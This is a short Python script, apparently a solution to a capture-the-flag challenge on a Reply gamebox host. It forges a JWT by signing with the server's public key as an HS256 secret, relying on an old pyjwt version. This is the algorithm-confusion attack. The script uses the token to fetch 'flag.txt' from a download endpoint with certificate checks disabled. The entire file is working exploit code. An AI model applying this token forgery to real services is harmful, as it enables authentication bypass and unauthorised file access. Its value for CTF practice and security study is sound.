#!/usr/bin/env python3
import jwt              # pip3 install pyjwt==0.4.3
import hashlib
import requests

# suppress unverified HTTPS warnings
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

url = "https://gamebox3.reply.it:20443/download.php?file="

filename = 'flag.txt'
filehash = hashlib.md5(filename.encode()).hexdigest()

payload = {"filename":filehash}

pubkey = open('pub.pem', 'rb').read()
token = jwt.encode(payload, key=pubkey, algorithm='HS256')
print("Token: " + token.decode())

r = requests.get(url + token.decode(), verify=False)
print(r.text)